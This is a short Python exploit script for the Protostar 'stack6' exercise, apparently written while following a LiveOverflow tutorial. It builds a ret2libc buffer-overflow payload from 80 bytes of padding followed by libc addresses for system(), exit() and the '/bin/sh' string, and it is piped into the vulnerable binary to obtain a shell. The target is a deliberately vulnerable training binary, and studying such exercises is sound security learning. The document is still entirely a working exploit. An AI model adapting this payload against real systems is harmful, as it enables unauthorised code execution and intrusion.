#!/usr/bin/python
# http://liveoverflow.com/binary_hacking/protostar/stack6.html
# Usage: (python stack6.py;cat) | /opt/protostar/bin/stack6
import struct

def m32(dir):
    return struct.pack("I",dir)
    
padding = "A" * 80
base = 0xb7e97000 # (gdb) info proc map
sys = m32(base + 0x038fb0) # readelf -s /lib/libc-2.11.2.so | grep system
exit = m32(base + 0x0002f0c0) # readelf -s /lib/libc-2.11.2.so | grep exit
binsh = m32(base + 0x011f3bf) # strings -tx /lib/libc-2.11.2.so | grep "/bin/sh"

print (padding + sys + exit + binsh)
